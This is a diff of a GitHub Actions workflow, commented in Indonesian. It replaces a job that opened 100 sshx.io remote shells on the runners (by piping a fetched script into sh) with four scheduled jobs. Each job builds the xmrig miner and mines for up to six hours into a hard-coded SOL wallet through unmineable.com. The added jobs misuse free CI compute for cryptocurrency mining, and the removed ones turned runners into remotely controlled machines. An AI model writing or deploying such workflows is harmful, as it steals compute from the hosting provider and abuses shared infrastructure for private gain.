@@ -1,37 +1,64 @@
-name: vps
+
+name: sol-miner
 
 on:
-  push:
-    branches: [ "main" ]
-  pull_request:
-    branches: [ "main" ]
   workflow_dispatch:
   schedule:
-    - cron: "0 */5 * * *"  # otomatis tiap 5 jam sekali
+    - cron: '0 */6 * * *'  # Jalan ulang setiap 6 jam
 
 jobs:
-  build:
+  miner1:
     runs-on: ubuntu-latest
-
+    timeout-minutes: 360
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@v4
-
-      - name: Jalankan 100 VPS instances via sshx.io
+      - name: Start Miner 1
         run: |
-          mkdir -p sshx-links
-          for i in $(seq 1 100); do
-            echo "Memulai VPS ke-$i..."
-            sshx_link=$(curl -sSf https://sshx.io/get | sh -s run 2>&1 | tee /dev/stderr | grep -o "https://sshx.io/[a-zA-Z0-9]*")
-            echo "VPS $i: $sshx_link" >> sshx-links/links.txt
-          done
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker1 -p x --threads=4
 
-      - name: Tampilkan Semua Link VPS
+  miner2:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 2
         run: |
-          echo "📡 Semua link VPS aktif:"
-          cat sshx-links/links.txt
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker2 -p x --threads=4
 
-      - name: Jalankan VPS selama 5 jam (timeout auto)
+  miner3:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 3
         run: |
-          echo "Menjaga VPS tetap hidup selama 5 jam..."
-          timeout 5h bash -c 'while true; do sleep 60; done'
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker3 -p x --threads=4
+
+  miner4:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 4
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker4 -p x --threads=4
